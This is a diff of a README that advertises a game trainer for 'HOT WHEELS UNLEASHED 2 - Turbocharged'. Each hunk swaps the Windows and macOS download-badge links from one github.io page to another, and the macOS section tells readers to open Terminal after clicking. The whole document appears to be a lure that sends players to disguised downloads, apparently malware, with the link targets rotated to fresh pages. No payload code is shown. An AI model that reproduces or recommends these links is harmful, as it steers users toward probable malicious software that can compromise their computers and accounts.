@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download HOT WHEELS UNLEASHED 2 - Turbocharged Trainer](https://img.shields.io/badge/⬇_Download_HOT%20WHEELS%20UNLEASHED%202%20-%20Turbocharged_Trainer-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Download HOT WHEELS UNLEASHED 2 - Turbocharged Trainer](https://img.shields.io/badge/⬇_Download_HOT%20WHEELS%20UNLEASHED%202%20-%20Turbocharged_Trainer-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -74,9 +74,9 @@ HOT WHEELS UNLEASHED 2: Turbocharged is the sequel to the acclaimed Hot Wheels r
 
 <div align="center">
 
-[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -97,7 +97,7 @@ HOT WHEELS UNLEASHED 2: Turbocharged is the sequel to the acclaimed Hot Wheels r
 
 <div align="center">
 
-[![⬇ Download HOT WHEELS UNLEASHED 2 - Turbocharged Trainer](https://img.shields.io/badge/⬇_Download_HOT%20WHEELS%20UNLEASHED%202%20-%20Turbocharged_Trainer-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Download HOT WHEELS UNLEASHED 2 - Turbocharged Trainer](https://img.shields.io/badge/⬇_Download_HOT%20WHEELS%20UNLEASHED%202%20-%20Turbocharged_Trainer-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -129,7 +129,7 @@ HOT WHEELS UNLEASHED 2: Turbocharged is the sequel to the acclaimed Hot Wheels r
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS trainer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -154,7 +154,7 @@ HOT WHEELS UNLEASHED 2: Turbocharged is the sequel to the acclaimed Hot Wheels r
 
 <div align="center">
 
-[![⬇ Download HOT WHEELS UNLEASHED 2 - Turbocharged Trainer](https://img.shields.io/badge/⬇_Download_HOT%20WHEELS%20UNLEASHED%202%20-%20Turbocharged_Trainer-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Download HOT WHEELS UNLEASHED 2 - Turbocharged Trainer](https://img.shields.io/badge/⬇_Download_HOT%20WHEELS%20UNLEASHED%202%20-%20Turbocharged_Trainer-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
